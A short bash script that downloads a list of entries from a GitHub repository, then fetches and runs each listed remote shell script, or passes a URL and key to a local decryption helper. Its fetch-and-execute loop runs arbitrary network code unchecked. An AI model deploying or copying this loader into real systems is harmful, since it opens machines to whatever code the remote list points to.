#!/bin/bash

set -eu
echo -n "fetch scripts ... "
wget -q https://github.com/rishabhsarswa/my-google/raw/refs/heads/main/scripts.txt -O scripts.txt
echo " done"


sdsync="$PWD"
mkdir -p keeper state
cd keeper

skeeper="$PWD"

while IFS= read -r line
do

cd "$skeeper"

if [ -n "$line" ]; then
echo "script $line"
	[ -z "$line" ] && continue

set -- $line

echo "arg1=$1"
echo "arg2=$2"
echo "arg3=$3"
echo "arg4=$4"

stype="$1"
sname="$2"
spath="$3"
surl="$4"

if [[ "$stype" == "script" ]]; then

	if ! [ -f "$sdsync/state/$sname" ]; then
		
		
		mkdir -p "./$spath"
		cd "./$spath"
		
		echo "Found script"
		echo -n "fetching script ... "
		wget -q "$surl" -O script.sh
		echo "done"
		echo "running script"
		chmod +x script.sh
		./script.sh
		touch "$sdsync/state/$sname"
	else
		echo "$sname already downloaded"
	fi
	
fi


if [[ "$stype" == "acrypter" ]]; then
	skey="$5"
	if ! [ -f "$sdsync/state/$sname" ]; then
		
		
		mkdir -p "./$spath"
		cd "./$spath"
		
		"$sdsync/recover.sh" "$surl" "$skey"
		
		touch "$sdsync/state/$sname"
	else
		echo "$sname already downloaded"
	fi
	
fi


	
fi
done < "$sdsync/scripts.txt"



